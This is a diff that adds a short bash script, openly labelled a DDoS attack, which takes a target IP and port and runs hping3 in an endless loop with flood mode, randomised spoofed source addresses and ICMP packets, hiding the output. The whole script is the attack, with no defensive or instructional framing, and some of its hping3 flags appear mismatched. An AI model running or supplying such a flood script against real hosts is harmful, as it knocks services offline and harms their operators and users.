@@ -1,0 +1,25 @@
+#!/bin/bash
+
+# Function to display the script usage
+display_usage() {
+    echo "Usage: $0 <target_ip> <target_port>"
+    echo "Example: $0 127.0.0.1 80"
+}
+
+# Check if the script is provided with required arguments
+if [ $# -ne 2 ]; then
+    display_usage
+    exit 1
+fi
+
+# Assign the provided arguments to variables
+target_ip=$1
+target_port=$2
+
+# Perform the DDoS attack using hping3
+echo "Starting DDoS attack on $target_ip:$target_port..."
+echo "Press Ctrl+C to stop the attack."
+
+while true; do
+    hping3 --flood --rand-source --icmp --data 100 --sign 100 --safe --scan 1000 $target_ip -p $target_port > /dev/null
+done
